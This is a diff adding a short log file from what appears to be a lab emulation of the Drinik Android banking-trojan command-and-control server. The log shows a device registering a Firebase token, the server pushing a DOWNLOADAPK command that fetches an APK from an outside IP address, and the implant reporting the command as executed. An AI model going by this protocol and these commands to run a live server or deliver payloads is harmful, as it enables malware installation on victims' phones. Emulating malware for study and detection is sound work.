@@ -1,0 +1,12 @@
+[11:34:17.515] [c2        ] listening on 198.12.107.13:80
+[11:34:18.066] [c2        ] POST /iaserver.php CMD=Token body=CMD=Token&Uid=UID-DRINIK-LAB-001&Token=fcm-token-drinik-lab-001
+[11:34:18.583] [dns       ] fcm.googleapis.com -> 172.217.114.4
+[11:34:18.583] [c2        ] FCM messages:send token=fcm-token-drinik-lab-001 data.CMD=DOWNLOADAPK:::http://192.3.124.14/AApk.apk
+[11:34:18.600] [c2        ] POST /iaserver.php CMD=insertServerCMD body=CMD=insertServerCMD&Uid=UID-DRINIK-LAB-001&ServerCMD=D%3A%3A%3A2026-08-21+11%3A34%3A18+--+DOWNLOADAPK%3A%3A%3Ahttp%3A%2F%2F192.3.124.14%2FAApk.apk+has+been+executed+-+OK%23%23-%23%23
+[11:34:18.600] [c2        ] insertServerCMD ServerCMD=D:::2026-08-21 11:34:18 -- DOWNLOADAPK:::http://192.3.124.14/AApk.apk has been executed - OK##-##
+[11:34:18.606] [c2        ] POST /iaserver.php CMD=insertServerCMD body=CMD=insertServerCMD&Uid=UID-DRINIK-LAB-001&ServerCMD=D%3A%3A%3A2026-08-21+11%3A34%3A18+--+firstDownloadCompleted%21%23%23-%23%23
+[11:34:18.607] [c2        ] insertServerCMD ServerCMD=D:::2026-08-21 11:34:18 -- firstDownloadCompleted!##-##
+[11:34:18.610] [c2        ] POST /iaserver.php CMD=insertServerCMD body=CMD=insertServerCMD&Uid=UID-DRINIK-LAB-001&ServerCMD=D%3A%3A%3A2026-08-21+11%3A34%3A18+--+SendMessage%3A%3A%3AfirstDownloadCompleted%21+has+been+executed+-+OK%23%23-%23%23
+[11:34:18.610] [c2        ] insertServerCMD ServerCMD=D:::2026-08-21 11:34:18 -- SendMessage:::firstDownloadCompleted! has been executed - OK##-##
+[11:34:18.638] [c2        ] FCM ACK HTTP 200 {"name":"projects/drinik-lab-project/messages/drinik-lab-message-001"}
+[11:34:28.899] [c2        ] stopping
